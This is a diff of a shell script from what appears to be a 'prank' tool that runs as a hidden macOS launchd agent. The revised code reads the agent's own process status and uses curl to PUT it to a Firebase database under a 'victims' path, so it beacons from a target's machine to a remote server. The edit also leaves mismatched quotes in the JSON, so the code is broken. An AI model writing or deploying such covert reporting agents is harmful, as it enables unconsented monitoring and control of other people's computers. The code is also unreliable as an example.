@@ -25,22 +25,15 @@ rootIteration="$2"
 
 echo $SCRIPTDIR
 
-psResult=`ps aux | grep "$SCRIPTDIR/deploy" | grep -v grep | head -n1`
-dPID=`echo "$psResult" | cut -d\  -f2`
-dCPU=`echo "$psResult" | cut -d\  -f3`
-dMEM=`echo "$psResult" | cut -d\  -f4`
-dSTAT=`echo "$psResult" | cut -d\  -f8`
-dSTART=`echo "$psResult" | cut -d\  -f9`
-dRUNTIME=`echo "$psResult" | cut -d\  -f10`
+dPID=`launchctl list | grep io.github.thiesgehrmann.arduinoPrank | cut -f1`
+psResult=`ps ux -p $dPID | tail -n1`
+
+echo `echo $psResult | cut -d' ' -f4`
 
 curl -X PUT -d "
   {
-    \"PID\" : \"$dPID\",
-    \"CPU\" : \"$dCPU\",
-    \"MEM\" : \"$dMEM\",
-    \"STAT\" : \"$dSTAT\",
-    \"STARTTIME\" : \"$dSTART\",
-    \"RUNTIME\" : \"$dRUNTIME\"
+    \"ps\" : \"$psResult',
+    \"PID\" : \"$dPID\"
   }" \
  "https://${firebaseProject}.firebaseio.com/victims/$victim/$thisTaskID.json"
 
